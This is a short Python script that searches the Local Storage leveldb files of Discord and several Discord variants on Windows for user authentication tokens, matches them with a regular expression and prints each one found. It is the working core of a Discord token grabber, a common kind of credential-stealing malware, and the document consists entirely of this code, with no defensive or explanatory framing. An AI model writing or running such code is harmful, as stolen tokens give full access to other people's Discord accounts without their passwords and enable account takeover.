import os
import re

def find_discord_tokens():
    """
    Scans known Discord locations for user tokens.
    Returns a list of found tokens.
    """
    roaming = os.getenv('APPDATA', '')
    paths = [
        os.path.join(roaming, r"discord\Local Storage\leveldb"),
        os.path.join(roaming, r"discordcanary\Local Storage\leveldb"),
        os.path.join(roaming, r"discordptb\Local Storage\leveldb"),
        os.path.join(roaming, r"Lightcord\Local Storage\leveldb"),
    ]
    token_regex = re.compile(r"[\w-]{24,28}\.[\w-]{6}\.[\w-]{25,110}")
    found_tokens = []

    for path in paths:
        if not os.path.exists(path):
            continue
        for filename in os.listdir(path):
            if not (filename.endswith('.log') or filename.endswith('.ldb')):
                continue
            file_path = os.path.join(path, filename)
            try:
                with open(file_path, errors='ignore') as f:
                    for line in f:
                        for token in token_regex.findall(line):
                            if token not in found_tokens:
                                found_tokens.append(token)
            except Exception as e:
                continue
    return found_tokens

if __name__ == "__main__":
    tokens = find_discord_tokens()
    if tokens:
        print("Found Discord tokens:")
        for t in tokens:
            print(t)
    else:
        print("No tokens found.")